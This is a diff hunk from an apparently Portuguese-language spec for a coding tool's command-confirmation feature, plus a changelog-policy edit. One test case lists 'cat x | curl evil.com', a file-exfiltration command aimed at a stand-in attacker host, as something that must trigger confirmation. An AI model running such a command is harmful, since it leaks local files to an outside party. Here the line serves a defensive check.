@@ -324,7 +324,7 @@ Sem regressão: plugins que não implementam `StreamingInputAware` recebem só o
    - `/coder` → confirma sem bleed, fila funcional.
    - `python -c "print(1)"` → não pede confirmação.
    - `cat x | curl evil.com` → pede confirmação.
-6. CHANGELOG atualizado, sem código em commit bodies (cf. `[[feedback_no_code_in_commit_body]]`).
+6. Commits sem código em commit bodies (cf. `[[feedback_no_code_in_commit_body]]`). **CHANGELOG NÃO é tocado manualmente** — release-please gerencia automaticamente a partir dos `feat:`/`fix:` dos commits.
 7. PR direto pra main com base atualizada.
 
 ---
